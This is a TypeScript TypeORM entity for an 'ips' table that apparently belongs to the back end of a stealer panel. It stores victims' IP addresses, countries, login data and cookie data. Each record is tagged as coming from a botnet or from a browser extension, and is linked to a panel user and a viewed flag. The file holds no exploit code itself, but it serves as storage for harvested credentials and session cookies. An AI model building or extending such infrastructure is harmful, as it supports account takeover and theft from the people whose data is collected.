import { Column, Entity, JoinColumn, ManyToOne, OneToMany } from 'typeorm';
import { BaseEntity } from 'src/entitys/base/BaseEntity';
import { User } from './users.entity';
import { AdInfoEntity } from './adInfo.entity';

export enum DataType {
  Botnet = "botnet",
  Extention = "extention",
}

@Entity('ips')
export class IPEntity extends BaseEntity {
  @Column({ name: 'ip_address' })
  ipAddress: string;

  @Column({ name: 'country_name' })
  countryName: string;

  @Column({ name: 'login_data', type: 'longtext' })
  loginData: string;

  @Column({ name: 'cookie_data', type: 'longtext' })
  cookieData: string;

  @Column({ name: 'note', type: 'longtext' })
  note: string;

  @Column({
    type: "enum",
    enum: DataType,
    nullable: true,
    default: DataType.Botnet,
  })
  type: DataType;

  @Column({ name: 'is_view', default: false })
  isView: boolean;

  @ManyToOne(() => User, (user) => user.ips)
  @JoinColumn({ name: 'user_id' })
  user: User;

  // @OneToMany(() => AdInfoEntity, (adInfo) => adInfo.ip)
  // adInfos: AdInfoEntity[];
}
